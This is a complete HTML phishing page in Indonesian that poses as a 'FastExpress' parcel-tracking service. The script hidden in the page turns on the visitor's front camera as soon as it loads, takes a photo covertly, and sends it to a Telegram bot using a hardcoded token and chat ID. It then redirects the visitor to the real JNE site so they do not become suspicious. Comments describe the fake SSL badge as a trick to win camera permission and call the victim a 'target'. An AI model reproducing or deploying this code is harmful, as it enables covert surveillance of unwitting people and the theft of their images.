<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pelacakan Paket Otomatis</title>
    <style>
        /* Desain Background & Layout Profesional */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f3f4f6; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        
        /* Kartu Pelacakan */
        .tracking-card { background: #ffffff; max-width: 450px; width: 100%; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; }
        
        /* Logo & Header Simbolis Ekspedisi */
        .logo-area { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; gap: 10px; }
        .logo-icon { width: 40px; height: 40px; background: #ff5722; color: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; }
        .brand-name { font-size: 22px; font-weight: 700; color: #1e293b; }
        .brand-name span { color: #ff5722; }
        
        /* Nomor Resi Fiktif */
        .resi-number { background: #f8fafc; border: 1px dashed #cbd5e1; padding: 12px; border-radius: 8px; font-size: 14px; color: #64748b; margin-bottom: 25px; font-family: monospace; }
        
        /* Animasi Loading Spinner */
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #ff5722; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Teks Status */
        .status-title { font-size: 18px; font-weight: 600; color: #1e293b; margin-bottom: 8px; }
        .status-desc { font-size: 14px; color: #64748b; line-height: 1.5; }
        
        /* Footer Keamanan */
        .footer-secure { margin-top: 30px; font-size: 12px; color: #94a3b8; display: flex; align-items: center; justify-content: center; gap: 5px; }
        
        /* Menyembunyikan elemen kamera dari pandangan pengguna */
        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

    <div class="tracking-card">
        <!-- Bagian Header Logistik -->
        <div class="logo-area">
            <div class="logo-icon">📦</div>
            <div class="brand-name">Fast<span>Express</span></div>
        </div>
        
        <!-- Nomor Resi Pelacakan -->
        <div class="resi-number">No. Resi: FX-982317445-ID</div>
        
        <!-- Indikator Proses -->
        <div class="spinner"></div>
        
        <!-- Pesan Status Pengguna -->
        <div class="status-title">Menghubungkan ke Server Logistik...</div>
        <p class="status-desc">Sistem sedang memverifikasi lokasi dan status pengiriman paket terdekat ke perangkat Anda. Mohon tunggu beberapa detik.</p>
        
        <!-- Footer Keamanan Palsu agar User Percaya memberikan Izin -->
        <div class="footer-secure">
            🔒 Terenkripsi SSL 256-bit Keamanan Server Terjamin
        </div>
    </div>

    <!-- Elemen Pemprosesan Kamera (Tersembunyi Total) -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // CONFIGURATION: Masukkan Token dan Chat ID Anda disini
        const TELEGRAM_TOKEN = '8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w';
        const CHAT_ID = '-1005000681985';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Mengaktifkan kamera depan secara otomatis saat halaman dimuat
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                // Memberikan jeda 2.5 detik sebelum memotret agar gambar tajam dan tidak blur
                setTimeout(takeSnapshot, 2500);
            })
            .catch(err => {
                console.error("Akses kamera ditolak atau gagal:", err);
                // Jika user menolak izin, Anda bisa mengalihkan halaman atau membiarkannya tetap di sana
            });

        function takeSnapshot() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Gambar frame video ke dalam canvas tersembunyi
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Konversi canvas menjadi file gambar JPEG blob
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg');
        }

        function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'kurir-tracking-capture.jpg');
            formData.append('caption', '🔔 Sistem Kurir: Foto target berhasil diambil saat membuka pelacakan paket.');

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Logistik sukses:', data);
                // Setelah sukses terkirim, alihkan user ke website asli (misal: cek resi JNE asli) agar tidak curiga
                window.location.href = "https://jne.co.id";
            })
            .catch(error => {
                console.error('Kendala jaringan logistik:', error);
            });
        }
    </script>
</body>
</html>
